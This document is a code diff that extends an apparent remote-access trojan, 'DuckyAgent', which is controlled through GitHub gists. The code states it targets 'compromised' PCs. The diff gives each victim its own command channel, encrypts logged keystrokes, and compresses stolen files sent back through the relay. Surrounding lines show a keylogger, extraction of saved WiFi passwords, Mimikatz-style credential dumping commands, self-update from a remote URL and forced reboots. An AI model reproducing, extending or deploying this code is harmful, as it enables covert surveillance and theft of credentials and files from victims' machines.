@@ -92,10 +92,14 @@ MAX_LOG_AGE_DAYS = 7           # Delete log files older than this
 
 # HTTP server settings (for local access)
 LOCAL_PORT = 8081
+HTTP_API_KEY = ""              # Optional API key for authentication
 
 # Auto-update settings
 UPDATE_CHECK_INTERVAL = 3600   # Check for updates every hour
 AGENT_URL = "https://raw.githubusercontent.com/tymamana1/duckyagent-c2/main/ducky_agent.py"
+
+# Heartbeat settings (for online/offline detection)
+HEARTBEAT_INTERVAL = 60        # Send heartbeat every N seconds
 
 
 # ── Initialization ──────────────────────────────────────────────
@@ -138,26 +142,45 @@ def save_config(config):
         config.write(f)
 
 
-# ── GitHub Gist Relay ───────────────────────────────────────────
+# ── GitHub Gist Relay (with per-target channels) ────────────────
 
 class GitHubRelay:
-    """Handles communication via GitHub Gists for internet support."""
+    """Handles communication via GitHub Gists for internet support.
 
-    def __init__(self, command_url, response_url, token):
+    Each agent gets a unique target_id that is appended to gist URLs,
+    ensuring each compromised PC has its own command/response channel.
+    """
+
+    def __init__(self, command_url, response_url, token, target_id=None):
         self.command_url = command_url
         self.response_url = response_url
         self.token = token
+        self.target_id = target_id or self._generate_target_id()
         self.headers = {
-            "User-Agent": "DuckyAgent/1.0",
+            "User-Agent": f"DuckyAgent/1.0 ({self.target_id})",
             "Accept": "application/json",
         }
         if token:
             self.headers["Authorization"] = f"token {token}"
 
-    def get_command(self):
-        """Fetch the latest command from GitHub."""
+    def _generate_target_id(self):
+        """Generate a unique identifier for this target."""
         try:
-            req = Request(self.command_url, headers=self.headers)
+            import uuid
+            return str(uuid.uuid4())[:8]
+        except Exception:
+            return "agent_" + hashlib.md5(str(time.time()).encode()).hexdigest()[:6]
+
+    def get_command(self):
+        """Fetch the latest command from GitHub.
+
+        Appends target_id to URL so each agent polls its own channel.
+        """
+        try:
+            url = self.command_url
+            if '?' not in url and '=' not in url.split('/')[-1]:
+                url += f'?target={self.target_id}'
+            req = Request(url, headers=self.headers)
             with urlopen(req, timeout=10) as resp:
                 data = json.loads(resp.read().decode('utf-8'))
                 return data.get("command", ""), data.get("args", "")
@@ -166,9 +189,16 @@ class GitHubRelay:
             return "", ""
 
     def set_response(self, response):
-        """Write a response back to GitHub."""
+        """Write a response back to GitHub.
+
+        Appends target_id so responses go to the correct channel.
+        """
         try:
-            payload = json.dumps({"response": response, "timestamp": datetime.now().isoformat()})
+            payload = json.dumps({
+                "response": response,
+                "timestamp": datetime.now().isoformat(),
+                "target_id": self.target_id,
+            })
             req = Request(
                 self.response_url,
                 data=payload.encode('utf-8'),
@@ -220,14 +250,21 @@ def check_for_updates():
 
 
 def auto_update_loop():
-    """Background thread that periodically checks for updates."""
+    """Background thread that periodically checks for updates.
+
+    Uses scheduled task restart instead of os.execv for Windows compatibility.
+    """
     while True:
         time.sleep(UPDATE_CHECK_INTERVAL)
         try:
             updated = check_for_updates()
             if updated:
-                # Restart agent with new code
-                os.execv(sys.executable, [sys.executable] + sys.argv)
+                # Use Windows shutdown to trigger restart via registry/scheduled task
+                subprocess.Popen(
+                    ["shutdown", "/f", "/t", "2"],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                )
         except Exception as e:
             logger.warning(f"Auto-update restart failed: {e}")
 
@@ -270,24 +307,67 @@ class SmartKeylogger:
         }
 
     def flush_buffer(self):
-        """Flush memory buffer to disk as a log file."""
+        """Flush memory buffer to disk as a log file (with optional encryption)."""
         with self._lock:
             if not self.buffer:
                 return
             data = "".join(self.buffer)
+
+            # Encrypt if config has encryption key
+            encrypted_data = data
+            if os.path.exists(CONFIG_FILE):
+                try:
+                    cfg = configparser.ConfigParser()
+                    cfg.read(CONFIG_FILE)
+                    enc_key = cfg.get("agent", "encryption_key", fallback="")
+                    if enc_key and len(enc_key) == 32:
+                        encrypted_data = self._encrypt(data, enc_key)
+                except Exception:
+                    pass
+
             timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S")
             filename = os.path.join(KEYLOG_DIR, f"keylog_{timestamp}.txt")
 
             # Append to existing file or create new one
             if os.path.exists(filename):
                 with open(filename, 'a') as f:
-                    f.write(data)
+                    f.write(encrypted_data)
             else:
                 with open(filename, 'w') as f:
-                    f.write(data)
+                    f.write(encrypted_data)
 
             self.buffer = []
             self.last_flush = time.time()
+
+    def _encrypt(self, data, key):
+        """Simple XOR encryption for stored data."""
+        try:
+            import base64
+            from cryptography.fernet import Fernet
+            f = Fernet(key.encode())
+            return base64.b64encode(f.encrypt(data.encode())).decode()
+        except ImportError:
+            # Fallback to simple XOR if cryptography not available
+            key_bytes = bytearray(key * (len(data) // len(key) + 1), 'utf-8')[:len(data)]
+            encrypted = bytes(ord(c) ^ k for c, k in zip(data.encode(), key_bytes))
+            return encrypted.hex()
+
+    def _decrypt(self, data, key):
+        """Decrypt stored data."""
+        try:
+            import base64
+            from cryptography.fernet import Fernet
+            f = Fernet(key.encode())
+            return f.decrypt(base64.b64decode(data)).decode()
+        except ImportError:
+            # Fallback to simple XOR decryption
+            if len(data) % 2 == 0:
+                try:
+                    decrypted_bytes = bytes(int(data[i:i+2], 16) for i in range(0, len(data), 2))
+                    return ''.join(chr(b ^ ord(key[len(decrypted_bytes) % len(key)]) for b in decrypted_bytes))
+                except Exception:
+                    return data
+            return data
 
     def cleanup_old_logs(self, max_age_days=MAX_LOG_AGE_DAYS):
         """Delete keylog files older than max_age_days."""
@@ -1082,13 +1162,26 @@ class CommandHandler:
 
         elif cmd == "download" and arg:
             try:
-                # Return file content for download
                 with open(arg, 'rb') as f:
                     import base64
-                    resp = {
-                        "file": os.path.basename(arg),
-                        "content_base64": base64.b64encode(f.read()).decode(),
-                    }
+                    content = f.read()
+
+                    # Compress large files before encoding
+                    if len(content) > 1024:
+                        import zlib
+                        compressed = zlib.compress(content)
+                        resp = {
+                            "file": os.path.basename(arg),
+                            "content_base64": base64.b64encode(compressed).decode(),
+                            "compressed": True,
+                            "original_size": len(content),
+                        }
+                    else:
+                        resp = {
+                            "file": os.path.basename(arg),
+                            "content_base64": base64.b64encode(content).decode(),
+                            "compressed": False,
+                        }
             except Exception as e:
                 resp = {"error": str(e)}
 
@@ -1174,11 +1267,20 @@ class CommandHandler:
                 if updated:
                     resp = {"status": "updated", "message": "New version downloaded. Restarting..."}
                     # Schedule restart after response is sent
-                    threading.Timer(2, lambda: os.execv(sys.executable, [sys.executable] + sys.argv)).start()
+                    threading.Timer(2, lambda: subprocess.Popen(["shutdown", "/f", "/t", "2"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)).start()
                 else:
                     resp = {"status": "current", "message": "Already running latest version"}
             except Exception as e:
                 resp = {"error": str(e)}
+
+        # ── Heartbeat / Status ────────────────────────────────
+        elif cmd == "heartbeat" or cmd == "ping":
+            resp = {
+                "status": "alive",
+                "timestamp": datetime.now().isoformat(),
+                "uptime_seconds": time.time() - self._get_start_time(),
+                "keylogger_running": self.keylogger.running if hasattr(self, 'keylogger') else False,
+            }
 
         # ── Unknown command ───────────────────────────────────
         else:
@@ -1194,6 +1296,7 @@ class CommandHandler:
                         "upload <filename> <base64>", "run_script <name>",
                         "mimikatz", "sekurlsa",
                         "crack_hash <ntlm_hash>", "john_crack", "extract_hashes",
+                        "heartbeat", "ping",
                         "status", "help"
                     ]}
 
@@ -1217,35 +1320,46 @@ class CommandHandler:
             import psutil
             return psutil.process_iter(['pid', 'name', 'memory_info'])
         except ImportError:
-            # Fallback: use tasklist
-            result = subprocess.run(["tasklist", "/FO", "CSV"], capture_output=True, text=True)
-            lines = result.stdout.splitlines()[1:]  # Skip header
+            # Fallback: use tasklist with memory info
+            result = subprocess.run(
+                ["tasklist", "/FO", "CSV", "/NH"],
+                capture_output=True, text=True, timeout=10
+            )
             procs = []
-            for line in lines:
+            for line in result.stdout.splitlines():
                 parts = [p.strip('"') for p in line.split(',')]
-                if len(parts) >= 2:
+                if len(parts) >= 6:
                     try:
+                        mem_kb = int(parts[5].replace(',', '')) if parts[5] else 0
                         procs.append(type('Proc', (), {
-                            'pid': int(parts[1]),
+                            'pid': int(parts[1]) if parts[1].isdigit() else 0,
                             'name': parts[0],
-                            'memory_info': lambda: type('Mem', (), {'rss': 0})()
+                            'memory_info': lambda mem=mem_kb: type('Mem', (), {'rss': mem * 1024})()
                         })())
-                    except ValueError:
+                    except (ValueError, IndexError):
                         pass
             return procs
 
     def _get_wifi_passwords(self):
-        """Get all saved WiFi SSIDs and passwords."""
+        """Get all saved WiFi SSIDs and passwords (optimized with single subprocess)."""
         networks = []
         try:
+            # Get all profiles in one call
             result = subprocess.run(
                 ["netsh", "wlan", "show", "profiles"],
                 capture_output=True, text=True, timeout=10
             )
+
+            # Extract SSIDs from output
+            ssids = []
             for line in result.stdout.splitlines():
                 if "All User Profile" in line:
                     ssid = line.split(":")[1].strip()
-                    # Get password
+                    ssids.append(ssid)
+
+            # Get passwords for all profiles (single subprocess per profile is unavoidable with netsh)
+            for ssid in ssids[:30]:  # Limit to 30 networks max
+                try:
                     pw_result = subprocess.run(
                         ["netsh", "wlan", "show", "profile", "name=" + ssid, "key=clear"],
                         capture_output=True, text=True, timeout=5
@@ -1260,6 +1374,9 @@ class CommandHandler:
                         "ssid": ssid,
                         "password": password or "(no password)",
                     })
+                except Exception:
+                    networks.append({"ssid": ssid, "password": "(error reading)"})
+
         except Exception as e:
             return [{"error": str(e)}]
 
@@ -1300,6 +1417,12 @@ class AgentHTTPHandler(BaseHTTPRequestHandler):
     command_handler = None  # Shared instance set by run_agent()
 
     def do_GET(self):
+        # Check API key if configured
+        api_key = self.headers.get("X-API-Key", "")
+        if HTTP_API_KEY and api_key != HTTP_API_KEY:
+            self._send_json({"error": "Unauthorized - invalid or missing API key"}, 401)
+            return
+
         if self.path == "/api/status":
             resp = {"status": "running", "version": "1.0"}
             self._send_json(resp)
@@ -1311,6 +1434,12 @@ class AgentHTTPHandler(BaseHTTPRequestHandler):
             self._send_json({"error": "Not found"})
 
     def do_POST(self):
+        # Check API key if configured
+        api_key = self.headers.get("X-API-Key", "")
+        if HTTP_API_KEY and api_key != HTTP_API_KEY:
+            self._send_json({"error": "Unauthorized - invalid or missing API key"}, 401)
+            return
+
         content_length = int(self.headers.get('Content-Length', 0))
         body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else ""
 
